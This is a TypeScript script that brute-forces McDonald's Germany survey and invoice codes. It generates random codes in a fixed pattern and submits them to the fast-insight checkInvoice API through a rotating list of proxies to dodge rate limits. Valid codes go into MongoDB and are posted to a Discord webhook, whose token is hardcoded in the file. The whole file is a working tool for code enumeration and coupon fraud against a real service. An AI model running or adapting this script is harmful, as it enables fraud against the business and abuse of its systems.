import fetch from 'node-fetch';
import HttpsProxyAgent from 'https-proxy-agent';
import fs from 'fs';
import { MongoManager } from './mongo';

const mongo = new MongoManager('mongodb://172.17.0.4:27017');

const url = 'https://mcdonalds.fast-insight.com/voc/bs/api/v3/de/checkInvoice'
mongo.connect()
function runCheck(agent: any) {
    const code = `b1qf-q${makeid(3)}-${makeid(4)}`
    const csrf = _uuid();
    fetch(url, {
        method: 'POST',
        agent: agent,
        headers: {
            'Content-Type': 'application/json',
            'cookie': 'csrf=' + csrf
        },
        body: generateJson(code, csrf)
    }).then(res => {
        res.json().then(async json => {
            if (json.status === 200) {
                if (await mongo.checkSurveyCode(code)) {
                    await mongo.insertSurveyCode(code)
                    const params = {
                        content: code
                    }
                    fetch("https://discord.com/api/webhooks/761639838084497487/VrHNINGED2Ay_-Zy1Pz5lEVLuYSnn_aozMSM2RrR726nqdj00DtRYub3M3p9eXA4EkvG", {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(params)
                    })
                } else {
                    console.log("duplicate detected " + code)
                }
            }
            runCheck(agent)
        }, () => {
            setTimeout(() => {
                runCheck(agent)
            }, 30000)
        })
    }, () => {
        runCheck(agent);
    });
}

getProxies()
async function getProxies() {
    const proxies = fs.readFileSync('proxies.txt').toString().split('\n');
    console.log(`loaded ${proxies.length} proxies`)
    proxies.forEach(async (proxy: any) => {
        const agent = HttpsProxyAgent('http://' + proxy);
        runCheck(agent);
    });

}

function makeid(length: number) {
    var result = '';
    var characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() *
            charactersLength));
    }
    return result;
}

function generateJson(code: string, csrf: string) {
    return JSON.stringify({
        "invoice": code,
        /*"meta":
        {
            "env": "production", "country": "de", "lang": "de", "isFromApp": false, "userInformation":
                { "firstname": "", "lastname": "", "deviceId": "", "deviceToken": "" },
            "products": "Undetected", "amountSpend": "Undetected"
        },*/
        "csrf": csrf
    })
}

function _uuid() {
    var d = Date.now();

    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
        var r = (d + Math.random() * 16) % 16 | 0;
        d = Math.floor(d / 16);
        return (c === 'x' ? r : r & 0x3 | 0x8).toString(16);
    });
};
